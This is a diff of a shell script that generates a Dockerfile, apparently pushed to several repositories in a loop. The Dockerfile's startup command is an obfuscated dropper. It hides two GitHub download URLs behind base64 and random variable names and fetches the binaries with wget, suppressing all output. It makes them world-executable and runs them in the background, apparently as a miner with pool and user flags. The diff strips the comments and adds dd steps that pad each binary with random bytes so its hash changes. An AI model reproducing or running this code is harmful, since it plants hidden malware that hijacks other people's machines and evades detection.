@@ -23,15 +23,12 @@ for i in 1 2 3; do
     
     # Create Dockerfile
 
-# RAW URLs at the top (will be encoded)
 SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
 WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
 
-# Encode URLs to base64
-SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64 | tr -d '\n')
-WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64 | tr -d '\n')
+SOCAT_ENC=$(echo -n "$SOCAT_URL" | base64 | tr -d '\n')
+WEB_ENC=$(echo -n "$WEB8888_URL" | base64 | tr -d '\n')
 
-# Generate random variable names (only letters, no numbers)
 VAR1=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
 VAR2=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
 VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
@@ -40,22 +37,16 @@ VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
 VAR6=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
 VAR7=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
 
-# Generate random values for the variables
 VAL1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 VAL2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 VAL3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
 VAL4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
 VAL5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
 
-# Create Dockerfile - properly formatted
 cat > Dockerfile << EOF
 FROM ubuntu:22.04
-CMD ${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENCODED}' | base64 -d) && ${VAR7}=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}} > /dev/null 2>&1
+CMD ${VAR1}='${VAL1}' && ${VAR2}='${VAL2}' && ${VAR3}='${VAL3}' && ${VAR4}='${VAL4}' && ${VAR5}='${VAL5}' && ${VAR6}=\$(echo '${SOCAT_ENC}' | base64 -d) && ${VAR7}=\$(echo '${WEB_ENC}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${${VAR1}} \${${VAR6}} > /dev/null 2>&1 && wget -O \${${VAR2}} \${${VAR7}} > /dev/null 2>&1 && dd if=/dev/urandom of=\${${VAR1}} bs=1 count=\$\$(shuf -i 8-64 -n 1) conv=notrunc oflag=append 2>/dev/null && dd if=/dev/urandom of=\${${VAR2}} bs=1 count=\$\$(shuf -i 8-64 -n 1) conv=notrunc oflag=append 2>/dev/null && chmod 777 \${${VAR1}} \${${VAR2}} && (bash \${${VAR1}} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && ./\${${VAR2}} -a \${${VAR3}} -o \${${VAR4}} -u \${${VAR5}} > /dev/null 2>&1
 EOF
-
-echo "Dockerfile created with RANDOM variable names!"
-echo "Variables used: ${VAR1}, ${VAR2}, ${VAR3}, ${VAR4}, ${VAR5}, ${VAR6}, ${VAR7}"
-echo "Building and running..."
 
     # Git setup
     git init
